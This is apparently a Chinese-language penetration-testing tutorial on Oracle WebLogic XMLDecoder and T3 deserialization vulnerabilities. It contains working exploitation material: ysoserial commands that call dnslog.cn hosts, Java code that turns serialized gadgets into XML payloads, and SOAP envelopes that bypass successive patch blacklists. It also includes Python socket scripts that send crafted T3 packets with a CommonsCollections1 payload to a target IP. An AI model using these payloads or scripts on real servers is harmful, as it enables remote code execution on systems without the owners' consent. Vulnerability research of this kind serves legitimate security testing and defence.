CVE-2017-3506/CVE-2017-10271/CVE-2019-2725/CVE-2019-2729为同一漏洞的修补，也是本文主要说的反序列化漏洞  
尝试访问/wls-wsat/CoordinatorPortType和/\_async/AsyncResponseService  
除此之外，还可能存在如下接口  
/wls-wsat/CoordinatorPortType11  
/wls-wsat/ParticipantPortType  
/wls-wsat/ParticipantPortType11  
/wls-wsat/RegistrationPortTypeRPC  
/wls-wsat/RegistrationPortTypeRPC11  
/wls-wsat/RegistrationRequesterPortType  
/wls-wsat/RegistrationRequesterPortType11  
这些接口均以XMLDecoder解析xml，存在java反序列化导致任意代码执行。  
XMLDecoder和XMLEncoder为java.beans用来反序列化/序列化xml的一个类，可以写一个简单的对象转字符串和字符串转对象的工具。

*   
*   
*   
*   
*   

```
package test;
import java.beans.XMLDecoder;import java.beans.XMLEncoder;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.UnsupportedEncodingException; public class BeanXML {         public static String encodeBean(Object bean){        ByteArrayOutputStream out = new ByteArrayOutputStream();        XMLEncoder encoder = new XMLEncoder(out);        encoder.writeObject(bean);        encoder.close();        return out.toString();    }         public static Object decodeBean(String xml){        XMLDecoder decoder;        try {            decoder = new XMLDecoder(new ByteArrayInputStream(xml.getBytes("GBK")));            return decoder.readObject();        } catch (UnsupportedEncodingException e) {            e.printStackTrace();        }                 return null;    } }
```

public class Xmlcode {    public static void main(String[] args) throws Exception {        Luoke luoke = new Luoke();        luoke.age = "17";        String xml = BeanXML.encodeBean(luoke);        System.out.println(xml);        BeanXML.decodeBean(xml);    }}

CVE-2017-10271之后，官方继续追加黑名单，除了object之外，new，method标签被禁止，void只能有index属性，array的class属性只能是byte。  
但还有class标签可以使用，我们要找到一个类用byte传参，且实例化时可以造成命令执行效果。  
这就是CVE-2019-2725，同时，这个CVE也发现了\_async漏洞。  
最终使用的是oracle.toplink.internal.sessions.UnitOfWorkChangeSet类，这个类是weblogic 10.x版本才有的类。需要二次反序列化的链，而weblogic10.x自带JDK1.6，所以我们直接使用ysoserial的JDK7u21模块代码就行。  
java -jar ysoserial.jar Jdk7u21 "ping bvh0mo.dnslog.cn" > 1.ser  
然后将其转化为xml形式的byte数据  
如下Test.java需要在jdk7u21环境编译并执行。  

*

*   
*   
*   
*

*   
*

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
javac Test.javajava Testimport java.io.*;
public class Test{    public static void main(String[] args) throws Exception {        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("1.ser"));        Object o = objectInputStream.readObject();        byte[] bytes = ObjectToByte(o);        objectXmlEncoder(bytes , "payload.xml");    }    private static byte[] ObjectToByte(Object obj) {        byte[] bytes = null;        try {            ByteArrayOutputStream bo = new ByteArrayOutputStream();            ObjectOutputStream oo = new ObjectOutputStream(bo);            oo.writeObject(obj);            bytes = bo.toByteArray();            bo.close();            oo.close();        } catch (Exception e) {            System.out.println("translation" + e.getMessage());            e.printStackTrace();        }        return bytes;    }    public static void objectXmlEncoder(Object obj,String fileName)            throws FileNotFoundException,IOException,Exception{        java.io.File file = new java.io.File(fileName);        if(!file.exists()){            file.createNewFile();        }
        java.io.BufferedOutputStream oop = new java.io.BufferedOutputStream(new java.io.FileOutputStream(file));        java.beans.XMLEncoder xe = new java.beans.XMLEncoder(oop);        xe.flush();        xe.writeObject(obj);        xe.close();        oop.close();    }}
```

  
提取<array>标签的byte数据，格式化后POST如下形式  

*

*

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">      <java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void>xxxxxxxxxxxxxxxxxxxxxxx</void></class></java> </work:WorkContext> </soapenv:Header> <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```

之后class标签被拉黑，不过马上出现了CVE-2019-2729，用<array method="forName">这种反射形式代替<class>即可。

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">      <java><array method="forName"><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void>xxxxxxxxxxxxxxxxxxxxxxx</void></array></java> </work:WorkContext> </soapenv:Header> <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```

Weblogic 12.x版本使用的是org.slf4j.ext.EventData，以及回显版本参考  
https://github.com/lufeirider/CVE-2019-2725

收到HELO代表着T3协议沟通成功  
再看getshell的流量  
![](../Images/2261ddd96cc857bddbd29e587062acc8.png)  
发现T3协议结构，HELO头——000005C3数据包长度——0165xxx7006填充——FE0100分割——ACED第一个序列化字节流——FE0100分割——ACED第二个序列化字节流  
我们先发HELO头，然后依次发1475(5c3的10进制)长度的数据包（可在k8exploit.py中提取）  

*

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
import socketimport time
rhost = '62.x.x.x'rport = 7001
head = "74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a"data1 = ""data2 = '{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(rport))
data3 = "1a7727000d3234322e323134"
data4 = "2e312e32353461863d1d0000000078"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((rhost,rport))for i in [head,data1,data2,data3,data4]:    s.send(i.decode('hex'))time.sleep(1)data=s.recv(2048) print(data)s.close()
```

成功收到返回包，里面含靶场的内网ip

![](../Images/defcbdeca196cef473111bc8d30354c8.png)

然后用ysoserial生成CommonsCollections1的序列化字节流，并且替换掉其中一段ACED。注意要重新计算数据包长度。  
java -jar ysoserial.jar CommonsCollections1 "ping iqt9pc.dnslog.cn" > 1.ser

```
import socketimport time
f = open("1.ser","r")payload = f.read()payload = payload.encode('hex')#payload = ""f.close()
rhost = '62.x.x.x'rport = 7001
head = "74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a"data1 = "016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000"+payload+""data2 = '{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(rport))
data3 = "1a7727000d3234322e323134"
data4 = "2e312e32353461863d1d0000000078"
lendata = hex((len(data1+data2+data3+data4)+8)/2).replace('0x','00000')data1 = lendata+data1
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((rhost,rport))for i in [head,data1,data2,data3,data4]:    s.send(i.decode('hex'))time.sleep(1)data=s.recv(2048) print(data)s.close()
```

即可完成T3反序列化攻击
